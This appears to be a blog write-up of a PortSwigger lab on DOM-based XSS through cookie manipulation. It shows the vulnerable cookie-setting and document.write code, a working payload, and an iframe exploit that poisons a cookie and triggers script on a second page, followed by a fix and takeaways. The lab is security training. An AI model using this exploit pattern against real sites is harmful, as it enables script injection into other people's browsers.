---
layout: post
title: "PortSwigger: DOM-Based Cookie Manipulation"
date: 2027-07-30 09:00:00 -0500
categories: [PortSwigger, XSS]
tags: [dom-based, xss, cookie-manipulation, document-write, window-location, CWE-79, iframe, exploit-server]
---

## Lab

**Topic:** DOM-Based Cookie Manipulation ([CWE-79](https://cwe.mitre.org/data/definitions/79.html))  
**Goal:** Inject a cookie that causes XSS on another page and call `print()`.

---

## The Vulnerability

This lab demonstrates a two-page DOM-based XSS where a **cookie acts as the tainted intermediary** between the source and sink.

**Product page** (source) stores the full current URL into a cookie:

```js
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure';
```

**Home page** (sink) reads that cookie and writes it unsanitized into the DOM:

```js
var cookieVal = document.cookie.match(/lastViewedProduct=([^;]+)/)[1];
document.write('<a href="' + cookieVal + '">Last viewed</a>');
```

**Source:** `document.cookie` (attacker-controlled because cookie value derives from URL)  
**Sink:** `document.write()` injecting into an HTML attribute value

---

## Why It Works

The application trusts that `lastViewedProduct` holds a safe URL — after all, only the product page sets it. But an attacker can control what URL a victim's browser loads in the product page by using an **iframe**. Once the product page JS runs, it stores that attacker-crafted URL (including any XSS payload) into the cookie. When the iframe then redirects to the home page, the poisoned cookie is read and sunk into `document.write`.

Payload in the product URL: `&'><script>print()</script>`
- `'` — closes the `href` attribute value
- `>` — closes the `<a>` tag
- `<script>print()</script>` — executes

---

## Exploit

Hosted on the exploit server and delivered to the victim:

```html
<iframe src="https://LAB.web-security-academy.net/product?productId=1&'><script>print()</script>"
        onload="if(!window.x)this.src='https://LAB.web-security-academy.net';window.x=1;">
```

**Two-step flow:**

1. iframe loads the product page with the crafted URL → product JS sets `lastViewedProduct` cookie to the poisoned URL.
2. `onload` fires → iframe redirects to `/` (home page). `window.x=1` guard prevents a redirect loop.
3. Home page reads the poisoned cookie → `document.write` injects the XSS payload → `print()` fires.

**Result:** `is-solved`

---

## The Fix

Both the source and the sink need hardening:

```js
// Product page: encode before storing in cookie
var safeUrl = encodeURIComponent(window.location);
document.cookie = 'lastViewedProduct=' + safeUrl + '; SameSite=None; Secure';

// Home page: DOM property assignment — no document.write with untrusted data
var cookieVal = decodeURIComponent(document.cookie.match(/lastViewedProduct=([^;]+)/)[1]);
var a = document.createElement('a');
a.href = cookieVal;
a.textContent = 'Last viewed';
document.querySelector('#lastviewed').appendChild(a);
```

Adding `Content-Security-Policy: script-src 'self'` also blocks injected inline `<script>` tags as defence-in-depth.

---

## Key Takeaways

- **Cookies are a tainted source.** Any cookie value derived from a URL parameter is attacker-controlled across origins (especially with `SameSite=None`).
- **`document.write` is a dangerous sink** — always use DOM property APIs (`element.href`, `element.textContent`) instead.
- **The iframe two-step pattern** lets attackers cross two pages in a single victim load: step 1 sets the tainted state (cookie), step 2 triggers the vulnerable read. The `onload` redirect + `window.x` guard makes this seamless with no user interaction.
- **`SameSite=Lax` or `Strict` on the cookie** would have prevented cross-site iframe loading from poisoning it — a meaningful defence at the cookie layer.
